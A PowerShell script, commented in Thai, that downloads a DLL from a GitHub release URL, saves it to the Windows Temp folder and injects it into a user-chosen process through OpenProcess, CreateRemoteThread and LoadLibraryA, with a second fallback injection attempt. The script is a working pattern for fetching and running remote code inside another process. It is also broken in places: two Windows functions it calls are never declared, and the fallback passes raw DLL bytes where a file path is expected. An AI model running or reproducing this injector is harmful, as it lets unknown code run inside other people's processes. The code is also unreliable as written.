$dllUrl = "https://github.com/newgen319/xxx_x1/releases/download/v1.0/xxx_x1_x64.dll"

Write-Host "Enter PID : " -NoNewline
$targetPid = [int](Read-Host)

Write-Host "Downloading DLL..."
$response = Invoke-WebRequest -Uri $dllUrl -UseBasicParsing -Headers @{"User-Agent"="Mozilla/5.0"}
$dllBytes = $response.Content
Write-Host "Downloaded $($dllBytes.Length) bytes"

# ใช้ PowerShell แบบง่าย: เขียน DLL ลง disk แล้วใช้ CreateRemoteThread + LoadLibrary
$tempPath = "C:\Windows\Temp\$([Guid]::NewGuid()).dll"
[System.IO.File]::WriteAllBytes($tempPath, $dllBytes)
Write-Host "DLL saved to: $tempPath"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr LoadLibraryA(string path);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr module, string name);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr process, IntPtr attr, uint size, IntPtr start, IntPtr param, uint flags, IntPtr id);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr handle, uint ms);
    [DllImport("kernel32.dll")]
    public static extern bool GetExitCodeThread(IntPtr handle, out uint code);
}
"@

$PROCESS_ALL_ACCESS = 0x1F0FFF
$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPid)
Write-Host "Process opened: $hProcess"

$kernel32 = [Kernel32]::GetProcAddress([Kernel32]::LoadLibraryA("kernel32.dll"), "LoadLibraryA")
$pathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempPath)
$pathBuffer = [Kernel32]::VirtualAllocEx($hProcess, 0, $pathBytes.Length, 0x3000, 0x04)
[Kernel32]::WriteProcessMemory($hProcess, $pathBuffer, $pathBytes, $pathBytes.Length, [ref][UIntPtr]::Zero)

$thread = [Kernel32]::CreateRemoteThread($hProcess, 0, 0, $kernel32, $pathBuffer, 0, 0)
[Kernel32]::WaitForSingleObject($thread, 10000)
$exitCode = 0
[Kernel32]::GetExitCodeThread($thread, [ref]$exitCode)

if ($exitCode -ne 0) {
    Write-Host "SUCCESS! DLL injected" -ForegroundColor Green
} else {
    Write-Host "FAILED - Trying direct memory injection..." -ForegroundColor Yellow
    # วิธี memory injection (LoadLibrary)
    $remoteBuffer = [Kernel32]::VirtualAllocEx($hProcess, 0, $dllBytes.Length, 0x3000, 0x04)
    [Kernel32]::WriteProcessMemory($hProcess, $remoteBuffer, $dllBytes, $dllBytes.Length, [ref][UIntPtr]::Zero)
    $thread2 = [Kernel32]::CreateRemoteThread($hProcess, 0, 0, $kernel32, $remoteBuffer, 0, 0)
    [Kernel32]::WaitForSingleObject($thread2, 5000)
    $exitCode2 = 0
    [Kernel32]::GetExitCodeThread($thread2, [ref]$exitCode2)
    if ($exitCode2 -ne 0) {
        Write-Host "SUCCESS! (memory injection)" -ForegroundColor Green
    } else {
        Write-Host "FAILED completely" -ForegroundColor Red
    }
    [Kernel32]::CloseHandle($thread2)
}

[Kernel32]::CloseHandle($thread)
[Kernel32]::CloseHandle($hProcess)

Write-Host "Done"
Read-Host "Press Enter"
